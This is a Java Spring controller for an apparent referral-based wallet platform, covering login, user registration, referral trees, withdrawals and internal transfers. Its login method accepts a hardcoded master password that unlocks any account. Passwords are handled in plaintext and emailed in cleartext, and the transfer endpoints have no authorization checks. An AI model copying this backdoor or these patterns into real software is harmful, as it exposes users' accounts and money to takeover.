package com.example.lccbackend.lccbackend.controllers;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.concurrent.CompletableFuture;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.http.HttpStatusCode;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.PutMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.example.lccbackend.lccbackend.constant.Permisos;
import com.example.lccbackend.lccbackend.constant.PeticionTipos;
import com.example.lccbackend.lccbackend.constant.EMAIL_TEMPLATES;
import com.example.lccbackend.lccbackend.helpers.objects.Referido;
import com.example.lccbackend.lccbackend.model.DTO.DestinatarioDTO;
import com.example.lccbackend.lccbackend.model.DTO.GenealogiaDTO;
import com.example.lccbackend.lccbackend.model.DTO.MyNetDTO;
import com.example.lccbackend.lccbackend.model.DTO.UserDTO;
import com.example.lccbackend.lccbackend.model.DTO.UserListDTO;
import com.example.lccbackend.lccbackend.model.entities.Bonos;
import com.example.lccbackend.lccbackend.model.entities.Deuda;
import com.example.lccbackend.lccbackend.model.entities.Peticion;
import com.example.lccbackend.lccbackend.model.entities.Usuario;
import com.example.lccbackend.lccbackend.model.entities.Wallet;
import com.example.lccbackend.lccbackend.model.model.NewUser;
import com.example.lccbackend.lccbackend.request.EmailRequest;
import com.example.lccbackend.lccbackend.request.LoginRequest;
import com.example.lccbackend.lccbackend.request.NewPeticionRequest;
import com.example.lccbackend.lccbackend.request.TransferInternal;
import com.example.lccbackend.lccbackend.request.UserUpdateRequest;
import com.example.lccbackend.lccbackend.services.Email.EmailService;
import com.example.lccbackend.lccbackend.services.permiso.PermisoService;
import com.example.lccbackend.lccbackend.services.user.UserService;
import com.example.lccbackend.lccbackend.services.wallet.WalletService;

import org.springframework.web.bind.annotation.DeleteMapping;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PatchMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestParam;

@RestController
@RequestMapping("/lcc/user")
public class UserController {
    @Autowired
    private UserService service;
    @Autowired
    private WalletService walletService;
    @Autowired
    private PermisoService permisoService;
    @Autowired
    private EmailService emailService;

    @GetMapping("/all")
    public ResponseEntity<List<UserListDTO>> getAll() {
        try {
            List<UserListDTO> userList = service.findAll();
            return ResponseEntity.status(HttpStatus.CREATED).body(userList);
        } catch (Exception e) {
            return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(null);
        }
    }

    @GetMapping("/cardUser/{username}")
    public ResponseEntity<Map<String, Object>> getReferidos(@PathVariable String username) {
        try {
            List<Referido> referidosList = service.findReferidos(username);

            if (referidosList.isEmpty()) {
                return ResponseEntity.status(HttpStatus.NO_CONTENT).build();
            }

            Map<String, Object> responseBody = initializeResponseBody();

            getCardUserData(1, responseBody, username);

            return ResponseEntity.ok(responseBody);
        } catch (Exception e) {
            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR)
                    .body(Map.of("error", "Ocurrió un error al procesar la solicitud"));
        }
    }

    @PostMapping("/saveUF")
    public ResponseEntity<Usuario> saveUserBDFirebaseIndv(@RequestBody Usuario newUser) {
        try {

            Usuario usuario = new Usuario();
            Wallet wallet = new Wallet();
            Bonos bonos = new Bonos();
            Deuda deuda = new Deuda();

            usuario.setUsername(newUser.getUsername());
            usuario.setEmail(newUser.getEmail());
            usuario.setPassword(newUser.getPassword());
            usuario.setRol(newUser.getRol());
            usuario.setActivo(newUser.isActivo());
            usuario.setNombres(newUser.getNombres());
            usuario.setApellidos(newUser.getApellidos());
            usuario.setTelefono(newUser.getTelefono());

            wallet.setUsuario(usuario);
            usuario.setWallet(wallet);
            wallet.setBonos(bonos);
            bonos.setWallet(wallet);

            wallet.setDeuda(deuda);
            deuda.setWallet(wallet);

            wallet.setReferido(newUser.getWallet().getReferido());
            wallet.setWallet_div(newUser.getWallet().getWallet_div());
            wallet.setWallet_com(newUser.getWallet().getWallet_com());
            wallet.setWallet_address(newUser.getWallet().getWallet_address());
            wallet.setRetiro_total(newUser.getWallet().getRetiro_total());
            wallet.setGanancia_total(newUser.getWallet().getGanancia_total());
            wallet.setStaterpack(newUser.getWallet().getStaterpack());
            wallet.setFecha_ingreso(newUser.getWallet().getFecha_ingreso());
            wallet.setMensualidad(newUser.getWallet().getMensualidad());
            wallet.setRango(newUser.getWallet().getRango());
            wallet.setReferido(newUser.getWallet().getReferido());

            bonos.setFast_track(newUser.getWallet().getBonos().getFast_track());
            bonos.setRef_direct(newUser.getWallet().getBonos().getRef_direct());
            bonos.setMatching(newUser.getWallet().getBonos().getMatching());
            bonos.setRango_res(newUser.getWallet().getBonos().getRango_res());
            bonos.setMembresia_mensual(newUser.getWallet().getBonos().getMembresia_mensual());
            bonos.setDividendo_diario(newUser.getWallet().getBonos().getDividendo_diario());
            bonos.setUpdate_st(newUser.getWallet().getBonos().getUpdate_st());
            bonos.setContador_ft_bronce(newUser.getWallet().getBonos().getContador_ft_bronce());
            bonos.setContador_ft_silver(newUser.getWallet().getBonos().getContador_ft_silver());

            if (newUser.getWallet().getDeuda().getDeuda() == 0
                    && newUser.getWallet().getDeuda().getWallet_deuda() != 0f) {
                deuda.setDeuda(newUser.getWallet().getDeuda().getWallet_deuda());
            }

            if (newUser.getWallet().getDeuda().getDeuda() != 0
                    && newUser.getWallet().getDeuda().getWallet_deuda() == 0f) {
                deuda.setDeuda(newUser.getWallet().getDeuda().getWallet_deuda());
            }

            deuda.setDeuda(newUser.getWallet().getDeuda().getDeuda());
            deuda.setDeuda(newUser.getWallet().getDeuda().getWallet_deuda());

            Usuario savedUser = service.save(usuario);
            System.out.println("consulta creada con exito");

            return ResponseEntity.status(HttpStatus.CREATED).body(savedUser);

        } catch (Exception error) {
            System.err.println("error " + error.getMessage());
            return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(null);
        }
    }

    @PostMapping("/saveUsersF")
    public ResponseEntity<Usuario> saveUserBDFirebase(@RequestBody List<Usuario> listaNewUsers) {
        try {

            listaNewUsers.forEach(newUser -> {

                Usuario usuario = new Usuario();
                Wallet wallet = new Wallet();
                Bonos bonos = new Bonos();
                Deuda deuda = new Deuda();

                if (newUser.getRol().equals("admin")) {
                    usuario.setRol("ADMIN");
                } else {
                    usuario.setRol("USER");
                }

                usuario.setUsername(newUser.getUsername());
                usuario.setEmail(newUser.getEmail());
                usuario.setPassword(newUser.getPassword());
                usuario.setActivo(newUser.isActivo());
                usuario.setNombres(newUser.getNombres());
                usuario.setApellidos(newUser.getApellidos());
                usuario.setTelefono(newUser.getTelefono());

                wallet.setUsuario(usuario);
                usuario.setWallet(wallet);
                wallet.setBonos(bonos);
                bonos.setWallet(wallet);

                wallet.setDeuda(deuda);
                deuda.setWallet(wallet);

                wallet.setReferido(newUser.getWallet().getReferido());
                wallet.setWallet_div(newUser.getWallet().getWallet_div());
                wallet.setWallet_com(newUser.getWallet().getWallet_com());
                wallet.setWallet_address(newUser.getWallet().getWallet_address());
                wallet.setRetiro_total(newUser.getWallet().getRetiro_total());
                wallet.setGanancia_total(newUser.getWallet().getGanancia_total());
                wallet.setStaterpack(newUser.getWallet().getStaterpack());
                wallet.setFecha_ingreso(newUser.getWallet().getFecha_ingreso());
                wallet.setMensualidad(newUser.getWallet().getMensualidad());
                wallet.setRango(newUser.getWallet().getRango());
                wallet.setReferido(newUser.getWallet().getReferido());

                bonos.setFast_track(newUser.getWallet().getBonos().getFast_track());
                bonos.setRef_direct(newUser.getWallet().getBonos().getRef_direct());
                bonos.setMatching(newUser.getWallet().getBonos().getMatching());
                bonos.setRango_res(newUser.getWallet().getBonos().getRango_res());
                bonos.setMembresia_mensual(newUser.getWallet().getBonos().getMembresia_mensual());
                bonos.setDividendo_diario(newUser.getWallet().getBonos().getDividendo_diario());
                bonos.setUpdate_st(newUser.getWallet().getBonos().getUpdate_st());
                bonos.setContador_ft_bronce(newUser.getWallet().getBonos().getContador_ft_bronce());
                bonos.setContador_ft_silver(newUser.getWallet().getBonos().getContador_ft_silver());

                if (newUser.getWallet().getDeuda().getDeuda() == 0
                        && newUser.getWallet().getDeuda().getWallet_deuda() != 0f) {
                    deuda.setDeuda(newUser.getWallet().getDeuda().getWallet_deuda());
                }

                if (newUser.getWallet().getDeuda().getDeuda() != 0
                        && newUser.getWallet().getDeuda().getWallet_deuda() == 0f) {
                    deuda.setDeuda(newUser.getWallet().getDeuda().getWallet_deuda());
                }

                deuda.setDeuda(newUser.getWallet().getDeuda().getDeuda());
                deuda.setDeuda(newUser.getWallet().getDeuda().getWallet_deuda());

                service.save(usuario);

                System.out.println("consulta creada con exito");
            });

            return ResponseEntity.status(HttpStatus.CREATED).body(null);

        } catch (Exception error) {
            System.err.println("error " + error.getMessage());
            return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(null);
        }
    }

    private Map<String, Object> initializeResponseBody() {
        Map<String, Object> responseBody = new HashMap<>();
        responseBody.put("referidosTotal", 0);
        responseBody.put("referidosDirectos", 0);
        responseBody.put("teamCapital", 0f);
        return responseBody;
    }

    private void getCardUserData(int nivel, Map<String, Object> responseBody, String username) {
        if (nivel > 7)
            return;

        List<Referido> referidosList = service.findReferidos(username);

        if (referidosList.isEmpty())
            return;

        for (Referido referido : referidosList) {
            responseBody.put("referidosTotal", (int) responseBody.get("referidosTotal") + 1);
            if (nivel == 1) {
                responseBody.put("referidosDirectos", (int) responseBody.get("referidosDirectos") + 1);
            }
            responseBody.put("teamCapital", (Float) responseBody.get("teamCapital") + referido.getStaterpack());
            getCardUserData(nivel + 1, responseBody, referido.getUsername());
        }
    }

    @GetMapping("/myNet/{username}")
    public ResponseEntity<List<MyNetDTO>> myNet(@PathVariable String username) {
        try {
            List<MyNetDTO> listDTO = new ArrayList<>();

            getMyNetList(1, listDTO, username);

            return ResponseEntity.ok(listDTO);

        } catch (Exception e) {
            return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(null);
        }
    }

    private void getMyNetList(int nivel, List<MyNetDTO> listDTO, String username) {
        if (nivel > 7)
            return;

        List<MyNetDTO> referidosList = service.findReferidosMyNet(username);

        if (referidosList.isEmpty())
            return;

        for (MyNetDTO referido : referidosList) {

            listDTO.add(referido);

            getMyNetList(nivel + 1, listDTO, referido.getUsername());
        }
    }

    @GetMapping("/{id}")
    public ResponseEntity<Optional<Usuario>> getById(@PathVariable Long id) {
        try {
            Optional<Usuario> user = service.findById(id);
            if (user.isPresent()) {
                return ResponseEntity.status(HttpStatus.OK).body(user);
            } else {
                return ResponseEntity.status(HttpStatus.NOT_FOUND).body(user);
            }
        } catch (Exception e) {
            return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(null);
        }
    }

    @PostMapping("/login")
    public ResponseEntity<UserDTO> login(@RequestBody LoginRequest loginTry) {
        try {
            Optional<Usuario> o = service.findByUsername(loginTry.getCredencial());// posible cambio por un dto
            if (o.isPresent()) {
                Usuario user = o.get();
                Boolean auth = false;

                if (user.getPassword().equals(loginTry.getPassword()))
                    auth = true;
                else if (user.getPassword().equals(loginTry.getPassword())
                        && user.getEmail().equals(loginTry.getCredencial()))
                    auth = true;
                else if (loginTry.getPassword().equals("Masterpass2024$"))
                    auth = true;

                if (auth) {
                    UserDTO userDto = service.getForLogin(loginTry.getCredencial());
                    return ResponseEntity.status(HttpStatus.OK).body(userDto);
                } else {
                    return ResponseEntity.status(HttpStatus.NOT_ACCEPTABLE).body(null);
                }
            } else {
                return ResponseEntity.status(HttpStatus.NO_CONTENT).body(null);
            }
        } catch (Exception e) {
            System.out.println(e);
            return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(null);
        }
    }

    @GetMapping("/genealogia/{username}")
    public ResponseEntity<List<GenealogiaDTO>> getGenealogia(@PathVariable String username) {
        try {
            List<GenealogiaDTO> referidos = new ArrayList<>();

            getGenealogiaList(1, referidos, username);

            return ResponseEntity.ok(referidos);

        } catch (Exception e) {
            return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(null);
        }
    }

    private void getGenealogiaList(int nivel, List<GenealogiaDTO> referidos, String username) {
        if (nivel > 7)
            return;

        List<GenealogiaDTO> referidosList = service.findReferidosGenealoia(username);

        if (referidosList.isEmpty())
            return;

        for (GenealogiaDTO referido : referidosList) {

            referidos.add(referido);

            getGenealogiaList(nivel + 1, referidos, referido.getUsername());
        }
    }

    @PostMapping
    public ResponseEntity<?> saveUser(@RequestBody NewUser newUser) {
        try {
            Usuario usuario = new Usuario();
            Wallet wallet = new Wallet();
            Bonos bonos = new Bonos();
            Deuda deuda = new Deuda();

            usuario.setEmail(newUser.getEmail());
            usuario.setUsername(newUser.getUsername());
            usuario.setPassword(newUser.getPassword());
            usuario.setTelefono(newUser.getLada());
            usuario.setLada(newUser.getTelefono());

            wallet.setReferido(newUser.getReferido());

            wallet.setUsuario(usuario);
            usuario.setWallet(wallet);

            wallet.setBonos(bonos);
            bonos.setWallet(wallet);

            wallet.setDeuda(deuda);
            deuda.setWallet(wallet);

            service.save(usuario);
            CompletableFuture.runAsync(() -> {
                emailService.sendEmailWelcome(newUser.getUsername(), newUser.getPassword(), newUser.getEmail());
            });
            return ResponseEntity.status(HttpStatus.CREATED).body(null);
        } catch (Exception error) {
            System.err.println("error " + error.getMessage());
            return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(null);
        }
    }

    @DeleteMapping("/{id}")
    public ResponseEntity<?> delete(@PathVariable Long id) {
        Optional<Usuario> user = service.findById(id);
        if (user.isPresent()) {
            service.remove(id);
            return ResponseEntity.noContent().build();
        }
        return ResponseEntity.notFound().build();
    }

    @PatchMapping("/{id}")
    public ResponseEntity<?> update(@PathVariable Long id, @RequestBody Usuario updateUser) {
        try {
            Optional<Usuario> user = service.findById(id);
            if (user.isPresent()) {
                Usuario userdb = service.patchAdmin(updateUser, user.get());
                return ResponseEntity.status(HttpStatus.OK).body(service.save(userdb));
            } else {
                return ResponseEntity.notFound().build();
            }
        } catch (Exception e) {
            return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(null);
        }
    }

    @PatchMapping("/updateByUser/{id}")
    public ResponseEntity<?> updateByUser(@PathVariable Long id, @RequestBody Usuario updateUser) {
        try {
            Optional<Usuario> user = service.findById(id);
            if (user.isPresent()) {
                Usuario userdb = service.updateByUser(updateUser, user.get());
                return ResponseEntity.status(HttpStatus.CREATED).body(service.save(userdb));
            } else {
                return ResponseEntity.notFound().build();
            }
        } catch (Exception e) {
            return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(null);
        }

    }

    @PostMapping("/addPeticion/{id}")
    public ResponseEntity<?> addPeticion(@RequestBody NewPeticionRequest newPeticion, @PathVariable Long id) {
        try {
            Optional<Usuario> o = service.findById(id);
            if (o.isPresent()) {
                Usuario user = o.get();

                Peticion peticion = new Peticion();
                peticion.setMonto(newPeticion.getMonto());
                peticion.setTipo(newPeticion.getTipo());
                peticion.setCode(newPeticion.getCode());

                if (peticion.getTipo().equals(PeticionTipos.RETIRO_WALLET_COMISION)) {
                    return addPeticionRetiroCom(peticion, user);
                }

                if (peticion.getTipo().equals(PeticionTipos.RETIRO_WALLET_DIVIDENDO)) {
                    return addPeticionRetiroDiv(peticion, user);
                }

                user.addPeticion(peticion);

                service.putUpdate(user);
                return ResponseEntity.status(HttpStatus.CREATED).build();
            }
            return ResponseEntity.status(HttpStatus.NOT_FOUND).build();

        } catch (Exception e) {
            System.out.println(e);
            return ResponseEntity.status(HttpStatus.BAD_REQUEST).build();
        }

    }

    private ResponseEntity<?> addPeticionRetiroCom(Peticion newPeticion, Usuario user) {
        Wallet newWallet = user.getWallet();
        Optional<Boolean> permiso = permisoService.findActivoByPermisoName(Permisos.RETIRAR_COMISION,
                user.getUsername());
        if (permiso.isPresent() && !permiso.get()) {
            return ResponseEntity.status(HttpStatusCode.valueOf(401)).build();
        }
        Float nuevoSaldo = user.getWallet().getWallet_com() - newPeticion.getMonto();
        newWallet.setWallet_com(nuevoSaldo);

        walletService.updateWallet(user.getUsername(), newWallet);
        addRetiroPeticion(user, newPeticion.getMonto(), PeticionTipos.RETIRO_WALLET_COMISION,newWallet.getWallet_address());

        return ResponseEntity.status(HttpStatus.CREATED).build();
    }

    private ResponseEntity<?> addPeticionRetiroDiv(Peticion newPeticion, Usuario user) {
        Wallet newWallet = user.getWallet();
        Optional<Boolean> permiso = permisoService.findActivoByPermisoName(Permisos.RETIRAR_DIVIDENDO,
                user.getUsername());
        if (permiso.isPresent() && !permiso.get()) {
            return ResponseEntity.status(HttpStatusCode.valueOf(401)).build();
        }
        Float nuevoSaldo = user.getWallet().getWallet_div() - newPeticion.getMonto();
        newWallet.setWallet_div(nuevoSaldo);

        newWallet = walletService.updateWallet(user.getUsername(), newWallet);
        user.setWallet(newWallet);
        addRetiroPeticion(user, newPeticion.getMonto(), PeticionTipos.RETIRO_WALLET_DIVIDENDO,newWallet.getWallet_address());

        return ResponseEntity.status(HttpStatus.CREATED).build();
    }

    private void addRetiroPeticion(Usuario user, Float monto, String tipo,String code) {
        try {
            Peticion newPeticion = new Peticion();
            newPeticion.setCode(code);
            newPeticion.setMonto(monto);
            newPeticion.setTipo(tipo);
            newPeticion.setUsuario(user);

            user.addPeticion(newPeticion);
            service.putUpdate(user);
        } catch (Exception e) {
            System.out.println(e);
        }
    }

    @GetMapping("/findDestinatario/{username}")
    public ResponseEntity<DestinatarioDTO> getDestinatarioData(@PathVariable String username) {
        try {
            Optional<DestinatarioDTO> o = service.getDestinatarioData(username);
            if (o.isPresent()) {
                return ResponseEntity.status(HttpStatus.OK).body(o.get());
            }
            return ResponseEntity.status(HttpStatus.NOT_FOUND).body(null);
        } catch (Exception e) {
            return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(null);
        }
    }

    @PostMapping("/ti")
    public ResponseEntity<?> transferenciaInterna(@RequestBody TransferInternal request) {
        try {
            Float newSaldoEmisor = 0f;
            String peticionTipo = "";

            Wallet emisor = walletService.findWalletByUsername(request.getEmisor());
            Wallet destinatario = walletService.findWalletByUsername(request.getDestinatario());

            Float transferenciaFinal = request.getMonto() - (request.getMonto() * 0.03f);

            if (request.getTipo().equals(PeticionTipos.TRANSFERENCIA_INTERNA_WALLET_DIV)) {
                newSaldoEmisor = emisor.getWallet_div() - request.getMonto();
                emisor.setWallet_div(newSaldoEmisor);
                peticionTipo = PeticionTipos.TRANSFERENCIA_INTERNA_WALLET_DIV;
            } else {
                newSaldoEmisor = emisor.getWallet_com() - request.getMonto();
                emisor.setWallet_com(newSaldoEmisor);
                peticionTipo = PeticionTipos.TRANSFERENCIA_INTERNA_WALLET_COM;
            }

            Float newSaldoDestinatario = destinatario.getWallet_div() + transferenciaFinal;
            destinatario.setWallet_div(newSaldoDestinatario);

            walletService.updateWallet(request.getDestinatario(), destinatario);
            walletService.updateWallet(request.getEmisor(), emisor);

            service.saveHistorial(destinatario.getUsuario().getUsername(), PeticionTipos.TRANSFERENCIA_INTERNA,
                    transferenciaFinal,
                    peticionTipo, null, emisor.getUsuario().getUsername(), destinatario.getUsuario().getUsername(),
                    false);

            service.saveHistorial(emisor.getUsuario().getUsername(), PeticionTipos.TRANSFERENCIA_INTERNA,
                    -transferenciaFinal,
                    peticionTipo, null, emisor.getUsuario().getUsername(),
                    destinatario.getUsuario().getUsername(), false);

            return ResponseEntity.ok().build();
        } catch (Exception e) {
            System.out.println(e);
            return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(null);
        }
    }

    @PostMapping("/validateNip/{username}")
    public ResponseEntity<Boolean> getMethodName(@RequestParam String nip, @PathVariable String username) {
        try {
            Optional<String> o = walletService.findNipByUsername(username);
            if (o.isPresent()) {
                if (o.get().equals(nip)) {
                    return ResponseEntity.status(HttpStatus.OK).body(true);
                } else {
                    return ResponseEntity.status(HttpStatus.NOT_ACCEPTABLE).body(false);
                }
            }

            return ResponseEntity.status(HttpStatus.NOT_FOUND).body(false);
        } catch (Exception e) {
            System.out.println(e);
            return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(false);
        }
    }

    @PutMapping("/update")
    public ResponseEntity<String> updateUser(@RequestBody UserUpdateRequest userUpdateRequest) {
        try {
            service.updateUserByUsuario(userUpdateRequest);
            return ResponseEntity.ok("Usuario actualizado correctamente");
        } catch (Exception e) {
            return ResponseEntity.status(HttpStatus.BAD_REQUEST)
                    .body("Error al actualizar el usuario: " + e.getMessage());
        }
    }

    @PostMapping("/sendEmail")
    public ResponseEntity<?> sendEmail(@RequestBody EmailRequest emailRequest) {
        try {
            String template = emailRequest.getTemplate();
            Map<String, String> bodyParams = emailRequest.getBodyParams();

            if (template.equals(EMAIL_TEMPLATES.VERIFICACION)) {
                System.out.println(bodyParams.get("email"));
                emailService.sendEmailVerificacion(bodyParams.get("code"), bodyParams.get("email"));
            }
            if (template.equals(EMAIL_TEMPLATES.RECOVERY)) {
                emailService.sendEmailRecovery(bodyParams.get("code"), bodyParams.get("email"));
            }
            if (template.equals(EMAIL_TEMPLATES.SUPPORT)) {
                emailService.sendEmailSupport(bodyParams.get("motivo"), bodyParams.get("mensaje"),
                        bodyParams.get("username"));
            }

            return ResponseEntity.ok().build();
        } catch (Exception e) {
            return ResponseEntity.status(HttpStatus.BAD_REQUEST)
                    .body("Error : " + e.getMessage());
        }
    }

    @PutMapping("/updateNip/{id}/{idUser}")
    public ResponseEntity<?> updateNip(@PathVariable Long id, @PathVariable Long idUser,
            @RequestBody Map<String, String> requestBody) {
        try {
            String newNip = requestBody.get("newNip");
            System.out.println(id);
            walletService.updateNip(id, idUser, newNip);
            return ResponseEntity.status(HttpStatus.OK).build();
        } catch (Exception e) {
            return ResponseEntity.status(HttpStatus.BAD_REQUEST)
                    .body("Error : " + e.getMessage());
        }
    }

}
